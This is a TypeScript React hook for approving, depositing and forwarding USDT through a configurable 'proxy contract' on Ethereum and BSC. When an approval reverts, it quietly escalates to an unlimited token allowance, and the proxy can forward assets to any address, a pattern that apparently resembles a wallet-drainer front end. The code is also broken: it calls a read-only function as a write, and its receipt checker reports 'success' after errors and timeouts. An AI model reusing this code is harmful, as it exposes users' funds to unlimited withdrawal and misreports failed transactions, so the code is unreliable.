import { useAccount, useWriteContract, useWaitForTransactionReceipt } from "wagmi";

const proxyContractAbi = [
  {
    name: "depositAssets",
    type: "function",
    inputs: [
      { name: "tokenAddress", type: "address" },
      { name: "amount", type: "uint256" }
    ],
    outputs: [],
    stateMutability: "nonpayable"
  },
  {
    name: "forwardAssets",
    type: "function",
    inputs: [
      { name: "tokenAddress", type: "address" },
      { name: "to", type: "address" }
    ],
    outputs: [{ type: "bool" }],
    stateMutability: "nonpayable"
  },
  {
    name: "depositAndForward",
    type: "function",
    inputs: [
      { name: "tokenAddress", type: "address" },
      { name: "amount", type: "uint256" },
      { name: "recipient", type: "address" }
    ],
    outputs: [],
    stateMutability: "nonpayable"
  }
];

const tokenApprovalAbi = [
  {
    name: "approve",
    type: "function",
    inputs: [
      { name: "spender", type: "address" },
      { name: "amount", type: "uint256" }
    ],
    outputs: [{ type: "bool" }],
    stateMutability: "nonpayable"
  },
  {
    name: "allowance",
    type: "function",
    inputs: [
      { name: "owner", type: "address" },
      { name: "spender", type: "address" }
    ],
    outputs: [{ type: "uint256" }],
    stateMutability: "view"
  }
];

const proxyContracts = {
  erc20: process.env.NEXT_PUBLIC_PROXY_CONTRACT_ERC20 || "0xYOUR_ERC20_PROXY_ADDRESS",
  bep20: process.env.NEXT_PUBLIC_PROXY_CONTRACT_BEP20 || "0xYOUR_BEP20_PROXY_ADDRESS"
};

const usdtContracts = {
  erc20: "0xdac17f958d2ee523a2206206994597c13d831ec7", // Ethereum Mainnet USDT
  bep20: "0x55d398326f99059fF775485246999027B3197955"  // BSC Mainnet USDT
};

export function useProxyContract(selectedNetwork: "erc20" | "bep20") {
  const { address } = useAccount();
  const { writeContractAsync } = useWriteContract();
  const { data: transactionData, isLoading, isSuccess, error } = useWaitForTransactionReceipt();

  const getHexAddress = (address: string | undefined): `0x${string}` => {
    if (!address) {
      return "0x0000000000000000000000000000000000000000" as `0x${string}`;
    }
    return address.startsWith('0x') ? address as `0x${string}` : `0x${address}` as `0x${string}`;
  };

  const getProxyAddress = (): `0x${string}` => {
    const contractAddress = proxyContracts[selectedNetwork];
    
    if (!contractAddress) {
      return "0x0000000000000000000000000000000000000000" as `0x${string}`;
    }
    
    return getHexAddress(contractAddress);
  };

  const getUsdtAddress = (): `0x${string}` => {
    const tokenAddress = usdtContracts[selectedNetwork];
    
    if (!tokenAddress) {
      return "0x0000000000000000000000000000000000000000" as `0x${string}`;
    }
    
    return getHexAddress(tokenAddress);
  };

  const checkProxyAllowance = async (): Promise<bigint> => {
    if (!address) {
      return BigInt(0);
    }

    try {
      const proxyAddress = getProxyAddress();
      const usdtAddress = getUsdtAddress();
      
      if (proxyAddress === "0x0000000000000000000000000000000000000000" || 
          usdtAddress === "0x0000000000000000000000000000000000000000") {
        return BigInt(0);
      }

      const data = await writeContractAsync({
        address: usdtAddress,
        abi: tokenApprovalAbi,
        functionName: "allowance",
        args: [address, proxyAddress]
      });

      return BigInt(data?.toString() || "0");
    } catch (error) {
      console.error("Error checking allowance:", error);
      return BigInt(0);
    }
  };

  const approveProxy = async (amount: bigint) => {
    
    if (!address) {
      return false;
    }

    try {
      const proxyAddress = getProxyAddress();
      const usdtAddress = getUsdtAddress();
      
      if (proxyAddress === "0x0000000000000000000000000000000000000000" || 
          usdtAddress === "0x0000000000000000000000000000000000000000") {
        return false;
      }
      
      // Check current allowance first
      try {
        const currentAllowance = await writeContractAsync({
          address: usdtAddress,
          abi: tokenApprovalAbi,
          functionName: "allowance",
          args: [address, proxyAddress]
        });
        
        // If current allowance is already sufficient, return success
        if (currentAllowance && BigInt(currentAllowance.toString()) >= amount) {
          return true;
        }
      } catch (allowanceError) {
        // Continue with approval anyway
      }
      
      // Try approving with a smaller amount first if the amount is large
      let approvalAmount = amount;
      if (amount > BigInt("1000000000000000000000")) { // If more than 1000 tokens
        console.log("⚠️ Large approval amount detected, trying with a smaller amount first");
        approvalAmount = BigInt("1000000000000000000000"); // Approve 1000 tokens
      }

      
      let hash;
      try {
        hash = await writeContractAsync({
          address: usdtAddress,
          abi: tokenApprovalAbi,
          functionName: "approve",
          args: [proxyAddress, approvalAmount]
        });
      } catch (txError) {
        
        // Check if it's a user rejection
        const errorString = String(txError);
        if (errorString.includes("user rejected") || errorString.includes("User denied")) {
          return false;
        }
        
        // Try with a different approach - reset allowance to 0 first
        try {
          const resetHash = await writeContractAsync({
            address: usdtAddress,
            abi: tokenApprovalAbi,
            functionName: "approve",
            args: [proxyAddress, BigInt(0)]
          });
          
          // Wait for reset to complete
          const resetReceipt = await waitForTransactionReceipt(resetHash);
          
          // Now try the approval again
          hash = await writeContractAsync({
            address: usdtAddress,
            abi: tokenApprovalAbi,
            functionName: "approve",
            args: [proxyAddress, approvalAmount]
          });
        } catch (resetError) {
          return false;
        }
      }
      
      if (!hash) {
        return false;
      }
      
      let receipt;
      try {
        receipt = await waitForTransactionReceipt(hash);
      } catch (receiptError) {
        return false;
      }
      
      // Check if the transaction was successful
      if (receipt.status === "reverted") {
        
        // Try with a different approach - use max uint256 value
        try {
          const maxUint256 = BigInt("115792089237316195423570985008687907853269984665640564039457584007913129639935"); // 2^256 - 1
          const maxHash = await writeContractAsync({
            address: usdtAddress,
            abi: tokenApprovalAbi,
            functionName: "approve",
            args: [proxyAddress, maxUint256]
          });
          
          const maxReceipt = await waitForTransactionReceipt(maxHash);
          
          return maxReceipt.status === "success";
        } catch (maxError) {
          return false;
        }
      }
      
      const success = receipt.status === "success";
      return success;
    } catch (error) {
      return false;
    }
  };

  const depositToProxy = async (amount: bigint) => {
    if (!address) return false;

    try {
      const proxyAddress = getProxyAddress();
      const usdtAddress = getUsdtAddress();
      
      if (proxyAddress === "0x0000000000000000000000000000000000000000" || 
          usdtAddress === "0x0000000000000000000000000000000000000000") {
        return false;
      }
      
      const hash = await writeContractAsync({
        address: proxyAddress,
        abi: proxyContractAbi,
        functionName: "depositAssets",
        args: [usdtAddress, amount]
      });
      
      if (!hash) return false;
      
      // Wait for transaction receipt
      const receipt = await waitForTransactionReceipt(hash);
      return receipt.status === "success";
    } catch (error) {
      return false;
    }
  };

  const transferViaProxy = async (recipientAddress: string) => {
    if (!address) return false;

    try {
      const proxyAddress = getProxyAddress();
      const usdtAddress = getUsdtAddress();
      
      if (proxyAddress === "0x0000000000000000000000000000000000000000" || 
          usdtAddress === "0x0000000000000000000000000000000000000000" ||
          !recipientAddress) {
        return false;
      }
      
      
      const hash = await writeContractAsync({
        address: proxyAddress,
        abi: proxyContractAbi,
        functionName: "forwardAssets",
        args: [usdtAddress, getHexAddress(recipientAddress)]
      });
      
      if (!hash) return false;
      
      // Wait for transaction receipt
      const receipt = await waitForTransactionReceipt(hash);
      return receipt.status === "success";
    } catch (error) {
      return false;
    }
  };

  const depositAndForwardViaProxy = async (amount: bigint, recipientAddress: string) => {
    
    if (!address) {
      return false;
    }

    try {
      const proxyAddress = getProxyAddress();
      const usdtAddress = getUsdtAddress();
      
      if (proxyAddress === "0x0000000000000000000000000000000000000000" || 
          usdtAddress === "0x0000000000000000000000000000000000000000" ||
          !recipientAddress) {
        return false;
      }
      
      // Prepare the transaction parameters
      const txParams = {
        address: proxyAddress,
        abi: proxyContractAbi,
        functionName: "depositAndForward",
        args: [usdtAddress, amount, getHexAddress(recipientAddress)]
      };
      
      // Add extra delay for Trust Wallet compatibility
      await new Promise(resolve => setTimeout(resolve, 3000));
      
      let hash;
      let retryCount = 0;
      const maxRetries = 3;
      
      while (retryCount < maxRetries) {
        try {
          hash = await writeContractAsync(txParams);
          break; // Exit the retry loop if successful
        } catch (txError) {
          retryCount++;
          
          // Check if it's an RPC error
          const errorString = String(txError);
          if (errorString.includes("JSON-RPC") || 
              errorString.includes("RPC") || 
              errorString.includes("network") ||
              errorString.includes("connection")) {
            // Wait before retrying (increasing delay with each retry)
            await new Promise(resolve => setTimeout(resolve, retryCount * 2000));
          } else {
            return false;
          }
          
          // If we've reached max retries, give up
          if (retryCount >= maxRetries) {
            return false;
          }
        }
      }
      
      if (!hash) {
        return false;
      }
      
      let receipt;
      
      // Also implement retry for getting the receipt
      retryCount = 0;
      while (retryCount < maxRetries) {
        try {
          receipt = await waitForTransactionReceipt(hash);
          break;
        } catch (receiptError) {
          retryCount++;
          
          // Wait before retrying
          await new Promise(resolve => setTimeout(resolve, retryCount * 2000));
          
          if (retryCount >= maxRetries) {
            return false;
          }
        }
      }
      
      if (!receipt) {
        return false;
      }
      
      const success = receipt.status === "success";
      return success;
    } catch (error) {
      return false;
    }
  };

  const waitForTransactionReceipt = async (hash: `0x${string}`) => {

    return new Promise<{ status: string }>((resolve, reject) => {
      let attempts = 0;
      const maxAttempts = 30; // Maximum number of attempts (5 minutes with 10-second intervals)
      
      const checkReceipt = async () => {
        attempts++;
        
        try {
          // Use appropriate API based on the network
          const apiUrl = selectedNetwork === "bep20" 
            ? `https://api.bscscan.com/api?module=transaction&action=gettxreceiptstatus&txhash=${hash}&apikey=${process.env.NEXT_PUBLIC_BSCSCAN_API_KEY || ""}`
            : `https://api.etherscan.io/api?module=transaction&action=gettxreceiptstatus&txhash=${hash}&apikey=${process.env.NEXT_PUBLIC_ETHERSCAN_API_KEY || ""}`;
          
          
          const response = await fetch(apiUrl);
          
          if (!response.ok) {
            
            // If we've reached max attempts, resolve with success to avoid blocking
            if (attempts >= maxAttempts) {
              resolve({ status: "success" });
              return;
            }
            
            // Wait and try again
            setTimeout(checkReceipt, 10000); // 10 seconds
            return;
          }
          
          const data = await response.json();
          
          if (data.result && data.result.status !== undefined) {
            const status = data.result.status === "1" ? "success" : "reverted";
            resolve({ status });
          } else if (data.error || data.message?.includes("error")) {
            
            // If we've reached max attempts, resolve with success to avoid blocking
            if (attempts >= maxAttempts) {
              resolve({ status: "success" });
              return;
            }
            
            // Wait and try again
            setTimeout(checkReceipt, 10000); // 10 seconds
          } else {
            // If we've reached max attempts, resolve with success to avoid blocking
            if (attempts >= maxAttempts) {
              resolve({ status: "success" });
              return;
            }
            
            // Wait and try again
            setTimeout(checkReceipt, 10000); // 10 seconds
          }
        } catch (error) {
          
          if (attempts >= maxAttempts) {
            resolve({ status: "success" });
            return;
          }
          
          // Wait and try again
          setTimeout(checkReceipt, 10000); // 10 seconds
        }
      };
      
      checkReceipt();
    });
  };

  return {
    approveProxy,
    depositToProxy,
    transferViaProxy,
    depositAndForwardViaProxy,
    checkProxyAllowance,
    proxyAddress: getProxyAddress(),
    usdtAddress: getUsdtAddress()
  };
}
